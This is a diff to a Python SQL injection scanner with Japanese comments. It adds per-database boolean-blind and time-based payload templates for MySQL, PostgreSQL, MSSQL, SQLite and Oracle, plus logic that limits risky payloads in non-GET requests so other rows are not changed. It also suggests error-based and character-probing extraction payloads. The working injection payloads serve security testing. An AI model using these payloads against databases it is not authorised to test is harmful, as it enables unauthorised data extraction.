@@ -124,34 +124,52 @@ BOUNDARIES = [
 ]
 # 式コンテキスト（コメントで後ろを消せない / WHERE 句ではない場所）用の境界。op は空。
 # 条件が真なら「値を変えない」式になり、偽のときだけ SQL エラーになる式を差し込む。
-#   num: 数値の位置（WHERE id=<値> / IN (<値>) / VALUES の数値）   … <値>-(0)
-#   str: 文字列の中（WHERE name='<値>' / INSERT・UPDATE の文字列値） … '<値>'||''
-#   lst: 並びの後ろ（ORDER BY / GROUP BY / IN の並び）                … <値>,(NULL)
+#   num: 数値の位置（WHERE id=<値> / IN (<値>) / 関数の引数 / VALUES の数値） … <値>-(0)
+#   str: 文字列の中（WHERE name='<値>' / INSERT・UPDATE の文字列値）          … '<値>'||''
+#   lst: 並びの後ろ（ORDER BY / GROUP BY / IN の並び）                         … <値>,(NULL)
 # 真のときに 1 や 'a' を返す形にすると、IN (...) に別の ID が増えたり別の行を指したりするので 0 / '' / NULL に限る。
 # 偽の側は「複数行を返す副問い合わせ」。SQLite はこれをエラーにしない（先頭行を使う）ので、
 # 先頭行も 0 / '' / NULL になる UNION ALL にし、SQLite には整数オーバーフローを使う専用の形を別に持つ。
-EXPR_BOUNDS = [    # (対象 DBMS, 種別, 接頭辞, 接尾辞)。対象 None は MySQL / PostgreSQL / MSSQL(str 以外) / Oracle 23 共通
-    (None,     "num", "-(CASE WHEN (", ") THEN 0 ELSE (SELECT 0 UNION ALL SELECT 0) END)"),
-    (None,     "str", "'||(SELECT CASE WHEN (", ") THEN '' ELSE (SELECT '' UNION ALL SELECT '') END)||'"),
-    (None,     "lst", ",(SELECT CASE WHEN (", ") THEN NULL ELSE (SELECT 0 UNION ALL SELECT 0) END)"),
-    # + は MySQL では数値の加算（WHERE col = 0 になり、数字でない文字列の全行に一致する）。
-    # MSSQL にしか無い @@SPID を入れて、ほかの DBMS では必ずエラーで止まるようにしてある
-    ("MSSQL",  "str", "'+(SELECT CASE WHEN @@SPID>0 AND (", ") THEN '' ELSE (SELECT '' UNION ALL SELECT '') END)+'"),
-    ("SQLite", "num", "-(CASE WHEN (", ") THEN 0 ELSE abs(-9223372036854775808) END)"),
-    ("SQLite", "str", "'||(CASE WHEN (", ") THEN '' ELSE abs(-9223372036854775808) END)||'"),
-    ("SQLite", "lst", ",(CASE WHEN (", ") THEN NULL ELSE abs(-9223372036854775808) END)"),
-    ("Oracle", "num", "-(CASE WHEN (", ") THEN 0 ELSE (SELECT 0 FROM DUAL UNION ALL SELECT 0 FROM DUAL) END)"),
-    ("Oracle", "str", "'||(SELECT CASE WHEN (", ") THEN NULL ELSE (SELECT 'a' FROM DUAL UNION ALL SELECT 'a' FROM DUAL) END"
-                      " FROM DUAL)||'"),
-    ("Oracle", "lst", ",(CASE WHEN (", ") THEN NULL ELSE (SELECT 0 FROM DUAL UNION ALL SELECT 0 FROM DUAL) END)"),
-    ("Oracle", "lst", ",(CASE WHEN (", ") THEN NULL ELSE 1/0 END)"),      # GROUP BY（副問い合わせが書けない）用
+#
+# 文字列の連結（|| / +）は DBMS ごとに意味が違う。MySQL では || が OR、+ が加算なので、連結のつもりの式が
+#   WHERE name='v'||(…)||'' AND owner=7  →  (name='v') OR (…) OR ('' AND owner=7)
+# となり、後ろの条件が外れて他人の行に一致する。そこで連結形にはその DBMS にしか無い関数・変数
+#（pg_backend_pid / sqlite_version / ORA_HASH / @@SPID）を入れ、ほかの DBMS では実行前のエラーで止まるようにしてある。
+# 最後の要素は「GET 以外・--risk 1 でも送ってよいか」。
+EXPR_BOUNDS = [    # (対象 DBMS, 種別, 接頭辞, 接尾辞, 安全か)。対象 None は MySQL / PostgreSQL / MSSQL / Oracle 23 共通
+    (None,         "num", "-(CASE WHEN (", ") THEN 0 ELSE (SELECT 0 UNION ALL SELECT 0) END)", True),
+    ("PostgreSQL", "str", "'||(SELECT CASE WHEN pg_backend_pid()>0 AND (",
+                          ") THEN '' ELSE (SELECT '' UNION ALL SELECT '') END)||'", True),
+    # MySQL の || は OR。参照系（GET / --risk 2）でだけ使う。真のとき 0 を返すので WHERE col='v' の結果は変えない
+    ("MySQL",      "str", "'||(SELECT CASE WHEN (", ") THEN 0 ELSE (SELECT 0 UNION ALL SELECT 0) END)||'", False),
+    (None,         "lst", ",(SELECT CASE WHEN (", ") THEN NULL ELSE (SELECT 0 UNION ALL SELECT 0) END)", True),
+    ("MSSQL",      "str", "'+(SELECT CASE WHEN @@SPID>0 AND (", ") THEN '' ELSE (SELECT '' UNION ALL SELECT '') END)+'", True),
+    ("SQLite",     "num", "-(CASE WHEN (", ") THEN 0 ELSE abs(-9223372036854775808) END)", True),
+    ("SQLite",     "str", "'||(CASE WHEN sqlite_version()>'' AND (", ") THEN '' ELSE abs(-9223372036854775808) END)||'", True),
+    ("SQLite",     "lst", ",(CASE WHEN (", ") THEN NULL ELSE abs(-9223372036854775808) END)", True),
+    ("Oracle",     "num", "-(CASE WHEN (", ") THEN 0 ELSE (SELECT 0 FROM DUAL UNION ALL SELECT 0 FROM DUAL) END)", True),
+    ("Oracle",     "str", "'||(SELECT CASE WHEN ORA_HASH('a')>=0 AND (",
+                          ") THEN NULL ELSE (SELECT 'a' FROM DUAL UNION ALL SELECT 'a' FROM DUAL) END FROM DUAL)||'", True),
+    ("Oracle",     "lst", ",(CASE WHEN (", ") THEN NULL ELSE (SELECT 0 FROM DUAL UNION ALL SELECT 0 FROM DUAL) END)", True),
+    ("Oracle",     "lst", ",(CASE WHEN (", ") THEN NULL ELSE 1/0 END)", True),      # GROUP BY（副問い合わせが書けない）用
 ]
+# GET 以外・--risk 1 で送る唯一の AND 型。MySQL / MariaDB 専用（@@sql_mode はほかの DBMS では実行前にエラーになる）。
+# MySQL には文字列の位置で「値を変えない式」が無いので、クォートを閉じ直す AND を使う。
+# AND は、値が括弧の中（IN ('v') / LOWER('v') / ('v')）にあると 0 / 1 という「値」に化けて別の行に効く。
+# 括弧を多く閉じすぎた形は構文エラーで止まる（無害）ので、深い方から順に試し、構文として通った深さで打ち切る
+#（それより浅い形は送らない）。対応するのは括弧 2 重まで。
+def _safe_and(q, depth):
+    return (q + ")" * depth + " AND @@sql_mode IS NOT NULL", " AND " + "(" * depth + "%sa%s=%sa" % (q, q, q))
+
+
+SAFE_AND_BOUNDS = [_safe_and(q, depth) for q in ("'", "\"") for depth in (2, 1, 0)]
 # time 用の式コンテキスト境界（連結・演算・並びに埋め込む）。中身は各 DBMS の遅延式。
-# 遅延したあとの値は 0 / '' / NULL（元の値を変えない）。MySQL の || は OR なので 0 を返す
-#（1 を返すと WHERE col='v' OR 1 になり全行に一致する）。
+# 遅延したあとの値は 0 / '' / NULL（元の値を変えない）。MySQL の文字列だけは上と同じ理由で AND を閉じ直す形。
+# ほかの DBMS の連結形は、中の遅延式（PG_SLEEP / DBMS_PIPE / sqlite_version 入りの重い処理）が MySQL では実行前にエラーになる。
 TIME_EXPR_BOUNDS = {
-    "MySQL":      [("'||(SELECT 0 FROM DUAL WHERE ", ")||'"), ("\"||(SELECT 0 FROM DUAL WHERE ", ")||\""),
-                   ("-(SELECT 0 FROM DUAL WHERE ", ")"), (",(SELECT NULL FROM DUAL WHERE ", ")")],
+    # 文字列は SAFE_AND_BOUNDS と同じ並び（深い括弧から）。遅延したら構文として通った証拠なので、そこで終わる
+    "MySQL":      [(pre + " AND ", suf) for pre, suf in SAFE_AND_BOUNDS]
+                  + [("-(SELECT 0 FROM DUAL WHERE ", ")"), (",(SELECT NULL FROM DUAL WHERE ", ")")],
     "PostgreSQL": [("'||(SELECT '' WHERE ", ")||'"), ("-(SELECT 0 WHERE ", ")"), (",(SELECT NULL WHERE ", ")")],
     "Oracle":     [("'||(SELECT NULL FROM DUAL WHERE ", ")||'"), ("-(SELECT 0 FROM DUAL WHERE ", ")"),
                    (",(SELECT NULL FROM DUAL WHERE ", ")")],
@@ -185,7 +203,10 @@ TIME_CORES = {
 # 「重い処理」。値は必ず 1 になる式で、{n} が大きいほど時間が掛かる。n=1 を対照にし、小さい方から段階的に上げる。
 #   (式, 既定で試す n, --risk 2 で追加する (式, n))
 _ORA_J = "ALL_USERS A,ALL_USERS B,ALL_USERS C,ALL_USERS D,ALL_USERS E,ALL_USERS F"
-_SQLITE_CTE = "(WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{n}) SELECT 1+0*COUNT(*) FROM c)"
+# sqlite_version() を入れて SQLite 以外ではエラーにする（WITH RECURSIVE は MariaDB / PostgreSQL でも動き、
+# MariaDB では '||(…)||' が OR になるため）
+_SQLITE_CTE = ("(WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{n}) "
+               "SELECT 1+0*COUNT(*) FROM c WHERE sqlite_version()>'')")
 _SQLITE_BLOB = "(SELECT 1+LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({n})))))"
 HEAVY = {
     # 再帰 CTE で数えるだけ（CPU のみ・メモリは増えない）。SQLite 3.8.3 未満は WITH RECURSIVE が無いので、
@@ -931,32 +952,63 @@ def allow_comment():
 def expr_bounds(ctx):
     """式コンテキストの境界 (接頭辞, 接尾辞) を、当たりそうな順に返す。"""
     out = []
-    for d, kind, pre, suf in EXPR_BOUNDS:
+    for d, kind, pre, suf, safe in EXPR_BOUNDS:
         if d is None:
             ok = ctx.dbms not in ("Oracle", "SQLite")       # SQLite は複数行の副問い合わせがエラーにならない
         else:
             ok = ctx.dbms in (None, d)
-        if ok:
+        if ok and (safe or allow_comment()):
             out.append((kind, pre, suf))
     first = "str" if ctx.quote == "'" else ("num" if ctx.numeric else None)
     out.sort(key=lambda e: e[0] != first)                   # 安定ソート: 種別の合うものを前へ
     return [(pre, suf) for _, pre, suf in out]
 
 
+def safe_and_bounds(ctx):
+    """GET 以外・--risk 1 用の AND 型（MySQL 専用）を (接頭辞, 接尾辞, クォート) で返す。深い括弧から順。"""
+    bs = [(pre, suf, pre[0]) for pre, suf in SAFE_AND_BOUNDS if ctx.dbms in (None, "MySQL")]
+    if ctx.quote:
+        bs.sort(key=lambda b: b[2] != ctx.quote)
+    return bs
+
+
 def bool_candidates(ctx):
-    """(接頭辞, 接尾辞, op)。AND → OR（--risk 2 のみ）→ 式コンテキストの順。
-       GET 以外・--risk 1 では、コメントで閉じる境界と「接頭辞なしの素の AND」を外す。
-       後者は DELETE ... WHERE id IN (<値> AND 1=1) のように真偽値が別の ID として解釈される文があるため
-       （数値の位置は式コンテキストの「<値>-(CASE ... THEN 0 ...)」で調べる）。"""
-    safe = not allow_comment()
-    bounds = [b for b in ordered_bounds(ctx) if not safe or (b[1] not in ("-- -", "#") and b != ("", ""))]
+    """(接頭辞, 接尾辞, op, 組)。AND → OR（--risk 2 のみ）→ 式コンテキストの順。
+       GET 以外・--risk 1 では AND 型を原則送らない。AND は値が比較の直接の相手でないと真偽値（0 / 1）に化け、
+         DELETE ... WHERE id IN (3 AND 1=1)        →  IN (1)
+         DELETE ... WHERE id IN (ABS(3) AND 1=1 AND (7=7))
+         DELETE ... WHERE id IN ('3' AND 1=1 AND 'a'='a')
+       のように別の ID の行に効くため。数値・文字列・並びの位置は「値を変えない式」で調べ、
+       その式が書けない MySQL の文字列だけ、MySQL でしか動かない AND（SAFE_AND_BOUNDS）を使う。
+       「組」は SAFE_AND_BOUNDS のクォート文字。同じ組は深い括弧から順に並んでいて、途中で打ち切ることがある。"""
+    if not allow_comment():
+        for pre, suf, q in safe_and_bounds(ctx):
+            yield pre, suf, "AND", q
+        for pre, suf in expr_bounds(ctx):
+            yield pre, suf, "", None
+        return
+    bounds = ordered_bounds(ctx)
     for pre, suf in bounds:
-        yield pre, suf, "AND"
+        yield pre, suf, "AND", None
     if CFG.risk >= 2:       # OR は UPDATE / DELETE の WHERE に入ると全行に効くので既定では送らない
         for pre, suf in bounds:
-            yield pre, suf, "OR"
+            yield pre, suf, "OR", None
     for pre, suf in expr_bounds(ctx):
-        yield pre, suf, ""
+        yield pre, suf, "", None
+
+
+def safe_guess(d, numeric, quote):
+    """GET 以外・--risk 1 で境界が未確定のまま提示するときの閉じ方。ツール自身が送るのと同じ「値を変えない」形にする。"""
+    if not numeric and d == "MySQL":
+        b = _safe_and('"' if quote == '"' else "'", 0)
+        return b[0], b[1], "AND"
+    kind = "num" if numeric else "str"
+    for want in (d, None):
+        for dd, k, pre, suf, safe in EXPR_BOUNDS:
+            if dd == want and k == kind and safe:
+                return pre, suf, ""
+    b = _safe_and("'", 0)
+    return b[0], b[1], "AND"
 
 
 def test_boolean(ctx):
@@ -964,9 +1016,28 @@ def test_boolean(ctx):
     # 動的ページでは偶然の差で 1 回分の確認を通り抜けることがあるので、確認の回数を増やす
     rounds = NUMS[1:3] if ctx.thr == 0 else NUMS[1:5]
     blocked = lambda r: r.status in WAF_STATUS and r.status != ctx.base.status
-    for pre, suf, op in bool_candidates(ctx):
+    # MySQL 用の AND（SAFE_AND_BOUNDS）は「構文として通った深さ」で打ち切る。そのために、クォートで構文を
+    # 壊したときの応答を先に取っておく。壊しても応答が変わらない（エラーが見えない）なら、AND で真偽の差が
+    # 出ることも無いので、その組は送らない
+    err_ref, closed = {}, set()
+
+    def broken(q, r):
+        """r は「構文エラーのときの応答」に見えるか。"""
+        e = err_ref[q]
+        return bool(ctx.new_db(r)) or (r.fp[0] != ctx.base.fp[0] and r.fp[0] == e.fp[0]) or not ctx.differ(r, e)
+
+    for pre, suf, op, group in bool_candidates(ctx):
+        if group:
+            if group not in err_ref:
+                e = err_ref[group] = send(pt, group)
+                if e.bad or not (ctx.new_db(e) or ctx.differ(e, ctx.base)):
+                    closed.add(group)
+            if group in closed:
+                continue
         mk = lambda a, b: cond_payload(pre, op, "%d=%d" % (a, b), suf)
         t1, f1 = send(pt, mk(NUM_A, NUM_A)), send(pt, mk(NUM_A, NUM_A + 1))
+        if group and not t1.bad and not broken(group, t1):
+            closed.add(group)       # この深さで構文が通った。これより浅い形は値の位置に入ってしまうので送らない
         if t1.bad or f1.bad or blocked(t1) or blocked(f1) or not ctx.differ(t1, f1):
             continue        # 片方だけ WAF に遮断された差は、SQL の真偽による差ではない
         # 別の数字でもう一度。真同士・偽同士が一致して初めて確定（偶然の差を排除）
@@ -1390,13 +1461,13 @@ def suggest(ctx):
     pt, S = ctx.pt, CFG.sleep
     guessed = ctx.bound is None
     cut_ok = allow_comment()        # 後続の SQL を消す形（コメント / スタック）を提示してよいか
+    numeric = ctx.numeric and not ctx.quote         # ' でも '' でも壊れた → 数値の位置
     if ctx.bound:
         pre, suf, op = ctx.bound
-    elif ctx.numeric and not ctx.quote:
-        pre, suf, op = "", "", "AND"                # ' でも '' でも壊れた → 数値の位置
+    elif numeric:
+        pre, suf, op = "", "", "AND"
     else:
-        qc = ctx.quote or "'"
-        pre, suf, op = (qc, "-- -", "AND") if cut_ok else (qc, " AND %sa%s=%sa" % (qc, qc, qc), "AND")
+        pre, suf, op = (ctx.quote or "'"), "-- -", "AND"
     known = ctx.dbms in INFO
     dlist = [ctx.dbms] if known else list(DBMS_LIST)
     out = []
@@ -1434,8 +1505,10 @@ def suggest(ctx):
         if "ERROR" in ctx.kinds:
             for n, (note, tmpl) in enumerate(I["err"]):
                 for title, qy in (steps[:4] if n == 0 else steps[:1]):     # 別形は 1 手だけ出す
+                    # 境界が未確定で、後続を消す形を出せない状況では、DBMS ごとの「値を変えない」形に載せる
+                    b = (pre, suf, op) if (ctx.bound or cut_ok) else safe_guess(d, numeric, ctx.quote)
                     out.append((tag + "error-based: %s をエラー文に出させる%s" % (title, note),
-                                cond_payload(pre, op, tmpl.format(q=qy), suf), None))
+                                cond_payload(b[0], b[2], tmpl.format(q=qy), b[1]), None))
         probe = I["chr"].format(q=I["user"] if d != "SQLite" else I["tables"]) + ">77"
         if "BOOL" in ctx.kinds:
             out.append((tag + "boolean blind: 1 文字目が 'M'(77) より大きいか。真/偽の応答で判定し、"
